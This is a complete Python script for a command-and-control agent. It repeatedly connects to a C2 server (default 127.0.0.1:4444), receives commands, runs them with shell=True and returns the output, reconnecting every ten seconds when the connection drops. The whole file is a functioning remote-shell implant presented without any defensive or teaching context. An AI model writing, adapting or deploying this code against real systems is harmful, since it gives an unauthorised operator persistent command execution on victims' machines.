#!/usr/bin/env python3
import socket
import json
import subprocess
import os

class C2Agent:
    def __init__(self, server_host='127.0.0.1', server_port=4444, agent_id='agent-001'):
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id
        
    def connect(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.server_host, self.server_port))
                print(f"[+] Connected to C2 server")
                
                while True:
                    # Send check-in
                    data = {'agent_id': self.agent_id, 'result': None}
                    sock.send(json.dumps(data).encode())
                    
                    # Receive command
                    response = sock.recv(1024).decode()
                    if response:
                        command_data = json.loads(response)
                        command = command_data.get('command')
                        
                        if command:
                            result = self.execute_command(command)
                            data = {'agent_id': self.agent_id, 'result': result}
                            sock.send(json.dumps(data).encode())
                            
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                import time
                time.sleep(10)  # Wait before reconnecting
                
    def execute_command(self, command):
        try:
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to {os.getcwd()}"
            else:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Error: {str(e)}"

if __name__ == "__main__":
    agent = C2Agent()
    agent.connect()